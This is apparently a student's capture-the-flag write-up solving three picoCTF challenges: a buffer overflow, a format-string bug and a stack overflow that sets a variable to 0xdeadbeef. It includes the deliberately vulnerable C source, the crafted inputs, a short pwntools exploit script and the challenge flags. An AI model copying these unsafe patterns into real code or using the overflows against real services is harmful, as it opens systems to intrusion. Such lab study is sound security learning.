# 1. binary overflow 0

> Let's start off simple, can you overflow the correct buffer? The program is available here. You can view source here.
Connect using:
nc saturn.picoctf.net 61116


## Solution:
What did we even had to do in this one I still don't understand, I did understand the code and I know the code had a vulnerability of not defining the value of input.  The flag variable was already loaded into memory at the start of main() and the func prints stdout if the program fails, So if I overflow the buffer valu then the program would give me the flag.

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}

void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}

int main(int argc, char **argv){
  
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }
  
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler); // Set up signal handler
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);


  printf("Input: ");
  fflush(stdout);
  char buf1[100];
  gets(buf1); 
  vuln(buf1);
  printf("The program will exit now\n");
  return 0;
}
```
<img width="1920" height="1080" alt="Screenshot From 2025-10-31 21-00-34" src="https://github.com/user-attachments/assets/61a640ff-c226-45bf-88d8-4fb81a5900dd" />
<img width="1920" height="1080" alt="Screenshot From 2025-10-31 21-00-48" src="https://github.com/user-attachments/assets/5abd1f3d-990d-4334-a839-983a674a4332" />
<img width="1920" height="1080" alt="Screenshot From 2025-10-31 21-01-12" src="https://github.com/user-attachments/assets/ef1e9efd-2b1b-4ac9-a785-d55094875287" />


## Flag:

```
picoCTF{ov3rfl0ws_ar3nt_that_bad_ef01832d}
```

## Concepts learnt:
Local variable storage process
The vulnerability with using functions like strcpy without bounds checking

## Resources:

[Basic Definitions](https://google.com)
[Buffer Overflow](https://www.youtube.com/watch?v=1S0aBV-Waeo)
***



# 2. format string 0

> Can you use your knowledge of format strings to make the customers happy?
Download the binary here.
Download the source here.
Connect with the challenge instance here:
nc mimas.picoctf.net 56854


## Solution:
Firstly I xonnected to the network and just chose one of the options amd it was not accepted then i studied the code properly there it was written `printf, int count = printf(choice1);` in function `server_patric`, So I used Gr%114d_Cheese for the first stage, the %114d format in the item tells printf to print a decimal number with 114 characters of padding, this makes the return count > 64, unlocking the second stage.Simmilarly for the second stage Cla%sic_Che%s%steak because this included three %s specifiers without any arguments which calls sigsegv_handler which prints the flag.
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 32
#define FLAGSIZE 64

char flag[FLAGSIZE];

void sigsegv_handler(int sig) {
    printf("\n%s\n", flag);
    fflush(stdout);
    exit(1);
}

int on_menu(char *burger, char *menu[], int count) {
    for (int i = 0; i < count; i++) {
        if (strcmp(burger, menu[i]) == 0)
            return 1;
    }
    return 0;
}

void serve_patrick();

void serve_bob();


int main(int argc, char **argv){
    FILE *f = fopen("flag.txt", "r");
    if (f == NULL) {
        printf("%s %s", "Please create 'flag.txt' in this directory with your",
                        "own debugging flag.\n");
        exit(0);
    }

    fgets(flag, FLAGSIZE, f);
    signal(SIGSEGV, sigsegv_handler);

    gid_t gid = getegid();
    setresgid(gid, gid, gid);

    serve_patrick();
  
    return 0;
}

void serve_patrick() {
    printf("%s %s\n%s\n%s %s\n%s",
            "Welcome to our newly-opened burger place Pico 'n Patty!",
            "Can you help the picky customers find their favorite burger?",
            "Here comes the first customer Patrick who wants a giant bite.",
            "Please choose from the following burgers:",
            "Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe",
            "Enter your recommendation: ");
    fflush(stdout);

    char choice1[BUFSIZE];
    scanf("%s", choice1);
    char *menu1[3] = {"Breakf@st_Burger", "Gr%114d_Cheese", "Bac0n_D3luxe"};
    if (!on_menu(choice1, menu1, 3)) {
        printf("%s", "There is no such burger yet!\n");
        fflush(stdout);
    } else {
        int count = printf(choice1);
        if (count > 2 * BUFSIZE) {
            serve_bob();
        } else {
            printf("%s\n%s\n",
                    "Patrick is still hungry!",
                    "Try to serve him something of larger size!");
            fflush(stdout);
        }
    }
}

void serve_bob() {
    printf("\n%s %s\n%s %s\n%s %s\n%s",
            "Good job! Patrick is happy!",
            "Now can you serve the second customer?",
            "Sponge Bob wants something outrageous that would break the shop",
            "(better be served quick before the shop owner kicks you out!)",
            "Please choose from the following burgers:",
            "Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak",
            "Enter your recommendation: ");
    fflush(stdout);

    char choice2[BUFSIZE];
    scanf("%s", choice2);
    char *menu2[3] = {"Pe%to_Portobello", "$outhwest_Burger", "Cla%sic_Che%s%steak"};
    if (!on_menu(choice2, menu2, 3)) {
        printf("%s", "There is no such burger yet!\n");
        fflush(stdout);
    } else {
        printf(choice2);
        fflush(stdout);
    }
}
```
<img width="1920" height="1080" alt="Screenshot From 2025-10-31 21-33-23" src="https://github.com/user-attachments/assets/58d5565a-1ee6-4e0b-9f8a-58b34781a731" />
<img width="1920" height="1080" alt="Screenshot From 2025-10-31 21-33-43" src="https://github.com/user-attachments/assets/a1929f86-1e92-40a9-a4f3-c5d72c613bcf" />
<img width="1920" height="1080" alt="Screenshot From 2025-10-31 21-33-58" src="https://github.com/user-attachments/assets/aae82d82-3a04-4935-9c13-ea782ae2e33d" />

## Flag:

```
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_c8362f05}
```

## Concepts learnt:
Format String Vulnerability 

## Resources:

[Basic Definitions](https://google.com)
[Format String Exploit](https://www.youtube.com/watch?v=0WvrSfcdq1I)
***



# 3. clutter-overflow

> Clutter, clutter everywhere and not a byte to use.
nc mars.picoctf.net 31890
Challenge Endpoints
Download chall.c	chall.c
Download chall	chall

## Solution:
What was this challenge I don't even know anymore.....what was its aim ,I Examined the source file fr vulnerabilities and found gets which is not a bounded function so is vulnerable. From reviewing the code I had an idea of the threshold size as 256 which it was not so used a lot of trial n error to find out 264 as the threshold, I noticed that if we overflow the value of clutter, It appends value of code and to crack the challenge we had to append the value of GOAL which was deadbeef. I tried to give input as GOAL and also tried to change the code but nothing worked. I watched a Youtube video and founfd a script which uses pwntools to fill the buffer append the value of code to deaddbeef while connected to the netwrork and get the flag. I got the pwntools library then ran the Program and got the flag.


chall.c :
```
#include <stdio.h>
#include <stdlib.h>

#define SIZE 0x100
#define GOAL 0xdeadbeef

const char* HEADER = 
" ______________________________________________________________________\n"
"|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^|\n"
"| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |\n"
"|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ==================^ ^ ^|\n"
"| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ___ ^ ^ ^ ^ /                  \\^ ^ |\n"
"|^ ^_^ ^ ^ ^ =========^ ^ ^ ^ _ ^ /   \\ ^ _ ^ / |                | \\^ ^|\n"
"| ^/_\\^ ^ ^ /_________\\^ ^ ^ /_\\ | //  | /_\\ ^| |   ____  ____   | | ^ |\n"
"|^ =|= ^ =================^ ^=|=^|     |^=|=^ | |  {____}{____}  | |^ ^|\n"
"| ^ ^ ^ ^ |  =========  |^ ^ ^ ^ ^\\___/^ ^ ^ ^| |__%%%%%%%%%%%%__| | ^ |\n"
"|^ ^ ^ ^ ^| /     (   \\ | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |/  %%%%%%%%%%%%%%  \\|^ ^|\n"
".-----. ^ ||     )     ||^ ^.-------.-------.^|  %%%%%%%%%%%%%%%%  | ^ |\n"
"|     |^ ^|| o  ) (  o || ^ |       |       | | /||||||||||||||||\\ |^ ^|\n"
"| ___ | ^ || |  ( )) | ||^ ^| ______|_______|^| |||||||||||||||lc| | ^ |\n"
"|'.____'_^||/!\\@@@@@/!\\|| _'______________.'|==                    =====\n"
"|\\|______|===============|________________|/|\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\n"
"\" ||\"\"\"\"||\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"||\"\"\"\"\"\"\"\"\"\"\"\"\"\"||\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"  \n"
"\"\"''\"\"\"\"''\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"''\"\"\"\"\"\"\"\"\"\"\"\"\"\"''\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\n"
"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\n"
"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"";

int main(void)
{
  long code = 0;
  char clutter[SIZE];

  setbuf(stdout, NULL);
  setbuf(stdin, NULL);
  setbuf(stderr, NULL);
 	
  puts(HEADER); 
  puts("My room is so cluttered...");
  puts("What do you see?");

  gets(clutter);


  if (code == GOAL) {
    printf("code == 0x%llx: how did that happen??\n", GOAL);
    puts("take a flag for your troubles");
    system("cat flag.txt");
  } else {
    printf("code == 0x%llx\n", code);
    printf("code != 0x%llx :(\n", GOAL);
  }

  return 0;
}
```
GETflag.py:
```
from pwn import *

fname = './chall'

r = remote('mars.picoctf.net', 31890)

r.sendline(b'A' * 264 + p64(0xdeadbeef))

r.interactive()
```
commands used:
```
nc mars.picoctf.net 31890
python3 GETflag.py 
pip install --upgrade pwntools
apt install python3-pwntools
sudo apt install python3-pwntools
python3 GETflag.py
```
<img width="1920" height="1080" alt="Screenshot From 2025-10-31 22-03-52" src="https://github.com/user-attachments/assets/ea0e4b08-ed09-44e7-a002-16fc6335c70c" />
<img width="1920" height="1080" alt="Screenshot From 2025-10-31 22-05-51" src="https://github.com/user-attachments/assets/84e4aabb-1501-4525-ba3a-7110c4fa217a" />
<img width="1920" height="1080" alt="Screenshot From 2025-10-31 22-06-06" src="https://github.com/user-attachments/assets/7775b86e-3c22-49c2-9740-d2ef891ce672" />
<img width="1920" height="1080" alt="Screenshot From 2025-10-31 22-11-06" src="https://github.com/user-attachments/assets/00b7be09-3997-4ab0-b161-a5149973d16d" />
<img width="1920" height="1080" alt="Screenshot From 2025-10-31 22-18-16" src="https://github.com/user-attachments/assets/b0031243-8d3d-4775-bcd7-f907ae95088c" />
<img width="1920" height="1080" alt="Screenshot From 2025-10-31 22-19-40" src="https://github.com/user-attachments/assets/c5630d2c-870a-45bf-9781-ca51e07b572b" />
<img width="1920" height="1080" alt="Screenshot From 2025-10-31 22-19-45" src="https://github.com/user-attachments/assets/2f6e3916-8fe4-41b8-8bff-e460e49be273" />
<img width="1920" height="1080" alt="Screenshot From 2025-10-31 22-19-50" src="https://github.com/user-attachments/assets/6d527e7d-ec6d-4724-8c3c-cfdc59b507f7" />
<img width="1920" height="1080" alt="Screenshot From 2025-10-31 22-20-17" src="https://github.com/user-attachments/assets/d779e1ee-89f1-43b5-bb82-5a00877631ad" />
<img width="1920" height="1080" alt="Screenshot From 2025-10-31 22-21-29" src="https://github.com/user-attachments/assets/9dffccd5-dbe7-43e4-9d23-3e0561694267" />

## Flag:

```
picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}
```

## Concepts learnt:
Buffer overflow Vulnerability

pwntool application

## Resources:

[Basic Definitions](https://google.com)
[Buffer append](https://www.youtube.com/watch?v=1S0aBV-Waeo)
***
